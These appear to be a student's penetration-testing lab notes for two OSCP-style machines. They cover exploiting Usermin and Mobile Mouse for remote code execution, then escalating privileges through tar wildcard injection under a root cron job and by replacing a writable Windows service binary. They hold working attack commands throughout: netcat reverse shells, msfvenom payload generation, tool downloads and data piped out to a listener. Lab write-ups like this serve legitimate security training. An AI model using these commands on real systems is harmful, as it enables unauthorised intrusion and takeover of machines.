20000/tcp open  http    MiniServ 1.820 (Webmin httpd)

Based on the Miniserv or usermin seen on the browser, found the exploit 50234.py
"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f;".format(listen_ip,listen_port)
"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.220 1337 >/tmp/f;".format(listen_ip,listen_port)

# Hint find the username using using files, files are found the using exiftool
exiftool FUNCTION-TEMPLATE.pdf | grep Author
Author  : Cassie

SSH login
First tried with public exploit
50234.py changed
listen_ip = "192.168.45.161"
listen_port = 1337 

python3 50234.py -u 192.168.157.157 -l cassie -p cassie 

#Error is 
python3 userminRCE.py -u 192.168.157.157 -l cassie -p cassie -lh 192.168.45.161 -lp 1337
#rlwrap nc -nlvp 1337
#Got shell

Tried to getting from ssh shell but keys are asking for password, tried with cassie as password but no luck

Priv Esc
linpeas.sh 
Some exploits
But their is grep "CRON" /var/log/syslog
Oct 14 02:16:01 oscp CRON[3716]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
Oct 14 02:16:01 oscp CRON[3715]: (CRON) info (No MTA installed, discarding output)
Oct 14 02:17:01 oscp CRON[11609]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)

cd /opt/admin cassie
echo "/bin/chmod 4755 /bin/bash" > shell.sh 
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
./shell.sh
/bin/chmod: changing permissions of '/bin/bash': Operation not permitted

Based on grep "CRON" /var/log/syslog has some file tar -zxf /tmp/backup.tar.gz *
tar cf /tmp/backup.tar.gz *
/bin/chmod: changing permissions of '/bin/bash': Operation not permitted

tar cf backup.tar.gz *
ls -l
total 24
-rw-r--r-- 1 cassie cassie     1 Oct 14 03:18 '--checkpoint-action=exec=sh shell.sh'
-rw-r--r-- 1 cassie cassie     1 Oct 14 03:18 '--checkpoint=1'
-rw-r--r-- 1 cassie cassie 10240 Oct 14 03:48  backup.tar.gz
-rwxr-xr-x 1 cassie cassie    26 Oct 14 03:17  shell.sh

ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash

/bin/bash -p
uid=1000(cassie) gid=1000(cassie) euid=0(root) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev)
#Got ROOT shell

```

## OSCPC 3 - Mobile mouse,  GPGOrchestrator, GPGService.exe, Service  - Windows 155

```jsx
192.168.229.155 
OSCPC - Mobile mouse,  GPGOrchestrator, GPGService.exe, Service - Windows

Nmap 
# Nmap 7.94SVN scan initiated Wed Oct  9 11:20:04 2024 as: nmap -sC -sV --open -p- -T4 -A -oN Nmap/Pascha155 -Pn 192.168.229.155
Nmap scan report for 192.168.229.155
Host is up (0.048s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
9099/tcp  open  unknown
9999/tcp  open  abyss?
35913/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Dir Buster No dir found 
gobuster dir -u http://192.168.229.155/ -w /usr/share/wordlists/dirb/big.txt 
gobuster dir -u http://192.168.229.155:9099/ -w /usr/share/wordlists/dirb/big.txt 
gobuster dir -u http://192.168.229.155:9999/ -w /usr/share/wordlists/dirb/big.txt 

Port 9099 found mouse exploit

50972.py -WiFi Mouse 1.7.8.5 - Remote Code Execution
51010.py -Mobile Mouse 3.6.0.4 - Remote Code Execution (RCE)

#Started python server and smbserver
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f exe > shell1234.exe
impacket-smbserver share . -smb2support
python3 -m http.server 8080
No response from this exploits https://github.com/blue0x1/mobilemouse-exploit, https://raw.githubusercontent.com/lof1sec/mobile_mouse_rce/refs/heads/main/mobile_mouse_rce.py 

#After checking the Discord chat some clue
msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=192.168.45.220 LPORT=443 -f exe -o shell.exe
python3 mobile_mouse_rce.py --target 192.168.242.155 --lhost 192.168.45.161 --file shell.exe
rlwrap nc -nlvp 443 
#Got shell

iwr -uri http://192.168.45.161:8080/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
iwr -uri http://192.168.45.161:8080/nc.exe -Outfile nc.exe
windows>Get-Content .\155winPEAS.txt | .\nc.exe 192.168.45.161 1122
kali# nc -lvp 1122 < 155winPEAS.txt

#Priv Esc
Tried one 

---------------------------------------------
OneDrive(7260)[C:\Users\Tim\AppData\Local\Microsoft\OneDrive\OneDrive.exe] -- POwn: Tim
    Permissions: Tim [AllAccess]
    Possible DLL Hijacking folder: C:\Users\Tim\AppData\Local\Microsoft\OneDrive (Tim [AllAccess])
    Command Line: "C:\Users\Tim\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background

C:\Users\Tim\AppData\Local\Microsoft\OneDrive\OneDrive.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                           BUILTIN\Administrators:(I)(F)
                                                           OSCP\Tim:(I)(F)
--------------------------------------------------------------Same tim user with shell

Installed Applications --Via Program Files/Uninstall registry--
    C:\Program Files\MilleGPG5(Users [WriteData/CreateFiles])                                     
GPGOrchestrator(Genomedics srl - GPG Orchestrator)["C:\Program Files\MilleGPG5\GPGService.exe"] - Auto - Running
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Users [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files\MilleGPG5 (Users [WriteData/CreateFiles])
--------------------------------------------------------------Same tim user with shell

https://raw.githubusercontent.com/lof1sec/mobile_mouse_rce/refs/heads/main/mobile_mouse_rce.py

msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=192.168.45.220 LPORT=443 -f exe -o shell.exe

#Replaced the msfvenom payload with the GPGService.exe then
#The service name mention mentioned at starting as GPGOrchestrator

rlwrap nc -nlvp 443
Restart-Service 'GPGOrchestrator'
#Got Admin Shell

	
```